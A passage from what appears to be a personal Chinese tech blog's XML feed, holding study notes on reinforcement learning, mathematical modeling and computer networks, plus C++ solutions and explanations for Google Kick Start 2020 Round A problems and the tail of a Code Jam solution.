class="number">0</span>]; i++) inq[q1[i]]=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=q1[<span class="number">0</span>]; i++) b[i]=q1[i];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=q1[<span class="number">0</span>]+<span class="number">1</span>, tt=<span class="number">1</span>; i&lt;=n; i++, tt++) &#123; <span class="keyword">while</span>(inq[tt]) tt++; b[i]=tt; &#125;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=n; j++) <span class="keyword">if</span>(inq[b[j]] &amp;&amp; col[j][b[j]]) &#123;</span><br><span class="line">                    <span class="keyword">int</span> ff=<span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> tt=j; tt&lt;=n; tt++) <span class="keyword">if</span>(!col[tt][b[j]]) &#123; ff=tt; <span class="keyword">break</span>; &#125;</span><br><span class="line">                    <span class="keyword">if</span>(!ff) <span class="keyword">for</span>(<span class="keyword">int</span> tt=<span class="number">1</span>; tt&lt;=j; tt++) <span class="keyword">if</span>(!col[tt][b[j]]) &#123; ff=tt; <span class="keyword">break</span>; &#125;</span><br><span class="line">                    <span class="keyword">if</span>(!ff) <span class="keyword">continue</span>;</span><br><span class="line">                    <span class="keyword">if</span>(ff&gt;j) <span class="keyword">for</span>(<span class="keyword">int</span> tt=j; tt&lt;ff; tt++) swap(b[tt], b[tt+<span class="number">1</span>]);</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">for</span>(<span class="keyword">int</span> tt=j; tt&gt;ff; tt--) swap(b[tt], b[tt<span class="number">-1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=n; j++) <span class="built_in">cout</span> &lt;&lt; b[j] &lt;&lt; <span class="string">" "</span>; <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=n; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(!a[i][j]) &#123;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> u=<span class="number">1</span>; u&lt;=n; u++) <span class="keyword">if</span>(!row[i][b[u]] &amp;&amp; !col[j][b[u]]) &#123;</span><br><span class="line">                            a[i][j]=b[u]; row[i][b[u]]=col[j][b[u]]=<span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=n; j&gt;<span class="number">1</span>; j--) swap(b[j], b[j<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) </span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=n; j++) </span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%d%c"</span>, a[i][j], <span class="string">" \n"</span>[j==n]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> problem </category>
          
      </categories>
      
      
        <tags>
            
            <tag> codejam </tag>
            
            <tag> problem </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强化学习笔记</title>
      <link href="/blog/note-deep-reinforce-learning/"/>
      <url>/blog/note-deep-reinforce-learning/</url>
      
        <content type="html"><![CDATA[<h2 id="Policy-Gradient"><a href="#Policy-Gradient" class="headerlink" title="Policy Gradient"></a>Policy Gradient</h2><h3 id="Policy-of-Actor"><a href="#Policy-of-Actor" class="headerlink" title="Policy of Actor"></a>Policy of Actor</h3><p>Policy $\pi$ is a network with parameter $\theta$</p><ul><li>Input: the observation of machine represented as a vector or a matrix.</li><li>Output: each action corresponds to a neuron in output layer.</li></ul><p>actor, env, reward</p><p>a round is an episode<br>total reward $R=\sum_{t} r_{t}$</p><p>Trajectory $\tau =\{s_1, a_1, s_2, a_2,\cdots, s_{T}, a_{T}\}$<br>$p_{\theta}(\tau) = p(s_1)p_{\theta}(a_1|s_1)p(s_2|s_1,a_1)p_{\theta}(a_2|s_2) \cdots = p(s_1)\Pi_{t=1}^{T}p_{\theta}(a_t|s_t)p(s_{t+1}|s_t,a_t)$<br>Expected Reward $\bar{R_{\theta}}=\sum_{\tau}R(\tau)p_{\theta}(\tau)$<br>$\triangledown R(\tau)=\sum_{\tau}R(\tau)\triangledown p_{\theta}(\tau)$</p><p>Baseline<br>就是把$R(\tau)$换成$R(\tau)-b$</p><p>Assign Suitable Credit<br>就是在时间点$t$把$R(\tau)-b$换成$\sum_{t’=t}^{T}r_{t’}$<br>因为离得越远影响越小可以进一步换成$\sum_{t’=t}^{T}\gamma^{t’-t}r_{t’},\gamma &lt; 1$<br>这个$b$也是可以state-dependent的<br>Advantage Function $A^{\theta}(s_t, a_t)$就是$R(\tau)-b$的那一部分</p><ul><li>How good it is if we take $a_t$ other than other actions at $s_t$.</li><li>Estimated by ‘critic’</li></ul><h2 id="From-on-policy-to-off-policy"><a href="#From-on-policy-to-off-policy" class="headerlink" title="From on-policy to off-policy"></a>From on-policy to off-policy</h2><ul><li>On-policy: The agent learned and the agent interacting with the environment is the same.</li><li>Off-policy: The agent learned and the agent interacting with the environment is different.</li></ul><p>Importance Sampling<br>在两个分布中算E是相等的，$E_{x\sim p}[f(x)]=E_{x\sim q}[f(x)\frac{p(x)}{q(x)}]$的结果是一样的，因为都会乘上一个概率，然后就消掉了分母的$q(x)$<br>举个例子为什么成立，如果两个分布峰值分别在两侧，一侧$f(x)$为正，一侧为负，如果sample到左侧乘一个负值，会让系数肥肠的大。<br>也可能就是小概率会有一个大系数，大概率会有一个小系数，最终期望值是一样的，但是方差可能非常的大</p><h2 id="PPO-TRPO"><a href="#PPO-TRPO" class="headerlink" title="PPO/TRPO"></a>PPO/TRPO</h2><p>Trust Region Policy Optimization(TRPO)<br>PPO前身，把constrain放在了里面</p><p>Proximal Policy Optimization(PPO)<br>$J_{PPO}^{\theta ‘}(\theta)=J^{\theta ‘}(\theta)-\beta KL(\theta, \theta ‘)$<br>$J^{\theta ‘}(\theta)=E_{(s_t, a_t)\sim \pi_{\theta ‘}}[\frac{p_{\theta}(a_t|s_t)}{p_{\theta ‘}(a_t|s_t)}A^{\theta ‘}(s_t, a_t)]$</p><p>PPO2就是限制了一下比值的范围</p><h2 id="Q-Learning"><a href="#Q-Learning" class="headerlink" title="Q-Learning"></a>Q-Learning</h2><p>Critic并不直接采取action，而是评价一个action的好坏<br>不断训练，每次获得一个更好的$V^{\pi}$，也就更新模型，而且保证每次取最大收益期望的那个一定优于之前的模型。</p>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> machine-learning </tag>
            
            <tag> deep-reinforce-learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学模型笔记</title>
      <link href="/blog/note-mathematical-modeling/"/>
      <url>/blog/note-mathematical-modeling/</url>
      
        <content type="html"><![CDATA[<p>蹭的数学系专业的选修课hhh<br>——20200324</p><hr><h2 id="1-指派问题"><a href="#1-指派问题" class="headerlink" title="1 指派问题"></a>1 指派问题</h2><p>问题 5个商店要建，分给5个承包商，分别有对应的$c_{i,j}$成本，让成本最小<br>思考<br>老师说的是设置0-1变量，也很好理解的咯。</p><p>而我一直在想怎么求解…枚举的复杂度就是阶乘没差了<br>我一开始想到就是匹配问题，显然是二分图匹配。<br>二分图匹配的题应该就能用网络流来做，就在想咋建模。<br>果然老了hhhh</p><p>变式1 成本改成工期<br>成本改成工期了以后，显然就是求max</p><h2 id="2-人员问题"><a href="#2-人员问题" class="headerlink" title="2 人员问题"></a>2 人员问题</h2><h2 id="3-可变成本问题"><a href="#3-可变成本问题" class="headerlink" title="3 可变成本问题"></a>3 可变成本问题</h2>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> mathematical-modeling </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络笔记</title>
      <link href="/blog/note-computer-network/"/>
      <url>/blog/note-computer-network/</url>
      
        <content type="html"><![CDATA[<p>马上要上网课了-，-<br>这**专业计算机网络还是选修课，我真nmb的服了，还好我能选<br>——20200302</p><hr><p>我觉得没必要抄书了…从此这些写重点和我感兴趣的拓展内容<br>之前写的当成劣质备份了，<a href="/blog/note-computer-network-bp/" title="计算机网络笔记bp">计算机网络笔记bp</a><br>——20200324</p><hr><p>谈到了很多白噪声，下面是定义<br>白噪声：白噪声是指在较宽的频率范围内，各等带宽的频带所含的噪声能量相等的噪声。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li>《计算机网络》(第七版)，谢希仁</li><li>《计算机网络》课件，张春元老师</li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法设计与分析笔记</title>
      <link href="/blog/note-algorithm/"/>
      <url>/blog/note-algorithm/</url>
      
        <content type="html"><![CDATA[<p>日常疑问：我还用学吗？<br>——20200312</p><hr><p>还需要233，重新看下算导吧<br>——20200322</p><hr><p>这篇文章同理，不在继续更了，记些感兴趣的，原文章<a href="/blog/note-algorithm-bp/" title="算法设计与分析笔记bp">算法设计与分析笔记bp</a><br>——20200324</p><hr>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KickStart2020 Round A</title>
      <link href="/blog/problem-kickstart-2020-round-A/"/>
      <url>/blog/problem-kickstart-2020-round-A/</url>
      
        <content type="html"><![CDATA[<p>好不容易记得一次比赛2333，希望还能记得codejam<br>题比较简单，100min我差不多做完rk400+，T3T4各提交错误了一次<br>最后rk429</p><hr><h2 id="T1-Allocation"><a href="#T1-Allocation" class="headerlink" title="T1 Allocation"></a>T1 Allocation</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>有$N$个房子要销售，有$B$块钱，每个房子价格$A_i$，问最多买多少套房子<br>$T\leqslant 100, N\leqslant 10^5, B\leqslant 10^5, A_i\leqslant 1000$</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>一开始被$B,A_i$的范围骗了233，以为是背包优化什么的<br>wdnmd排序贪心就完事了</p><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100050</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T, n, B, ans, tmp;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;T); </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> t=<span class="number">1</span>; t&lt;=T; t++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;B);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a[i]);</span><br><span class="line">        ans = <span class="number">0</span>, tmp=<span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        sort(a+<span class="number">1</span>, a+n+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(tmp+a[i]&lt;=B) &#123;</span><br><span class="line">                tmp += a[i];</span><br><span class="line">                ans++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Case #%d: %d\n"</span>, t, ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="T2-Plates"><a href="#T2-Plates" class="headerlink" title="T2 Plates"></a>T2 Plates</h2><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h3><p>$N$摞碟子，每摞$K$个碟子，每个碟子有一个权值，选一个碟子要选以上的所有碟子，选$P$个碟子问最多的权值<br>$T\leqslant 100, N\leqslant 50, K\leqslant 30, P\leqslant N\times K$</p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>就dp咯<br><code>f[i][j]</code>表示前<code>i</code>摞碟子选<code>j</code>个获得的最大权值，转移就是枚举这摞碟子选几个<code>f[i][j]=max{f[i][j], f[i-1][j-k]}</code>，枚举<code>k</code><br>简单背包，复杂度就是$O(NKP)$</p><h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">55</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> K = <span class="number">33</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[N][K];</span><br><span class="line"><span class="keyword">int</span> f[N][N*K];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T, n, k, p;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;T);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> t=<span class="number">1</span>; t&lt;=T; t++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;n, &amp;k, &amp;p);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=k; j++) &#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a[i][j]);</span><br><span class="line">                a[i][j]+=a[i][j<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">memset</span>(f, <span class="number">0</span>, <span class="keyword">sizeof</span>(f));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;=k; j++) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> u=j; u&lt;=p; u++) &#123;</span><br><span class="line">                    f[i][u]=max(f[i][u], f[i<span class="number">-1</span>][u-j]+a[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Case #%d: %d\n"</span>, t, f[n][p]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="T3-Workout"><a href="#T3-Workout" class="headerlink" title="T3 Workout"></a>T3 Workout</h2><h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h3><p>一个长度为$N$的序列，中间可以插入$K$个元素，让相邻的差最小，问最小多少。</p><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>一开始想到的是贪心，写了一个堆，发现并不对233<br>例如<code>10 20</code>中间插入4个的时候，应该是<code>10 12 14 16 18 20</code>，但如果每次选最多的再插入一开始就会出现15，然后出现小数，不妥<br>贪心也确实是正确的，再每次强行截断就可以，这就需要二分答案了，然后贪心判断就可以了。复杂度就是$O(N\log N)$</p><h3 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100050</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> a[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>; i&lt;=n; i++) &#123;</span><br><span class="line">        <span class="keyword">double</span> t=<span class="number">1.0</span>*(a[i]-a[i<span class="number">-1</span>])/x;</span><br><span class="line">        ans+=<span class="built_in">ceil</span>(t)<span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T, k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;T);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> t=<span class="number">1</span>; t&lt;=T; t++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;k);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        ll l=<span class="number">1</span>, r=<span class="number">1e9</span>, mid;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;=r) &#123;</span><br><span class="line">            mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(mid)&lt;=k) r=mid<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">else</span> l=mid+<span class="number">1</span>;</span><br><span class="line">        &#125; <span class="built_in">printf</span>(<span class="string">"Case #%d: %lld\n"</span>, t, l);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="T4-Bundling"><a href="#T4-Bundling" class="headerlink" title="T4 Bundling"></a>T4 Bundling</h2><h3 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h3><p>$N$个字符串，分成每组$K$个，$N$能被$K$整除，每组的贡献是最长公共前缀的长度，问最多贡献。<br>$T\leqslant 100, K\leqslant N\leqslant 10^5, \text{the total number of characters} \leqslant 2\times 10^6$</p><h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p>首先想到的还是贪心，直接sort然后选相邻的。<br>但这样是不对的，举个例子这样会破坏后面的高贡献<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br><span class="line">AAA</span><br><span class="line">OOOOOOOO</span><br><span class="line">OOOOOOOO</span><br><span class="line">ZZZZ</span><br></pre></td></tr></table></figure></p><p>这种情况显然让A和Z去配对，留下较长的。<br>一般最长公共前缀都会想到Trie树吧，Trie树上的最近公共祖先的深度就是最长公共前缀，那就想想怎么用Trie树做<br>感觉应该是一个树形DP的样子<br>最后也比较简单咯，还是用到了一个贪心的想法，如果一个子树中数量大于$K$个，那么显然不可能让这些去和别的子树组成一组，而是让多余的组成一组。那么去除子树中整个组的元素，剩下的具体是那些我们其实是并不关心的，因为他们一定和其他子树组成一组，最长公共前缀一定在当前节点或者更网上的节点。如果剩下的所有的元素可以组成一个新组，那么一定在这个节点的地方组。<br>说白了，就是从下往上选组，够$K$个就在当前节点合并，不够就继续往上传。<br>复杂度就是节点个数，遍历了一遍，再乘上26的常量。<br>ps.这题的样例有点弱，自己造一下试试</p><h3 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">2000500</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> T, n, k;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Trie</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> rt, cnt;</span><br><span class="line">    <span class="keyword">int</span> ch[N][<span class="number">26</span>];</span><br><span class="line">    <span class="keyword">int</span> sz[N], tsz[N];</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">newnode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cnt++;</span><br><span class="line">        <span class="built_in">memset</span>(ch[cnt], <span class="number">0</span>, <span class="keyword">sizeof</span>(ch[cnt]));</span><br><span class="line">        sz[cnt]=<span class="number">0</span>, tsz[cnt]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cnt=<span class="number">0</span>;</span><br><span class="line">        rt=newnode();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="built_in">string</span> a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x=rt;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;a.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> v=a[i]-<span class="string">'A'</span>; sz[x]++;</span><br><span class="line">            <span class="keyword">if</span>(!ch[x][v]) ch[x][v]=newnode();</span><br><span class="line">            x=ch[x][v];</span><br><span class="line">        &#125; sz[x]++, tsz[x]++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">dp</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> d)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> t=tsz[x], res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">26</span>; i++) <span class="keyword">if</span>(ch[x][i]) &#123;</span><br><span class="line">            <span class="keyword">if</span>(sz[ch[x][i]]&gt;=k) res+=dp(ch[x][i], d+<span class="number">1</span>);</span><br><span class="line">            t+=sz[ch[x][i]]%k;</span><br><span class="line">        &#125; res+=<span class="keyword">int</span>(t/k)*d;</span><br><span class="line"><span class="comment">//cout &lt;&lt; x &lt;&lt; " " &lt;&lt; d &lt;&lt; " " &lt;&lt; sz[x] &lt;&lt; " " &lt;&lt; tsz[x] &lt;&lt; " " &lt;&lt; res &lt;&lt; endl; </span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; tr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;T);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> t=<span class="number">1</span>; t&lt;=T; t++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;k);</span><br><span class="line">        tr.init();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">            <span class="built_in">string</span> s; <span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">            tr.insert(s);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Case #%d: %d\n"</span>, t, tr.dp(tr.rt, <span class="number">0</span>));</span><br><span class="line">    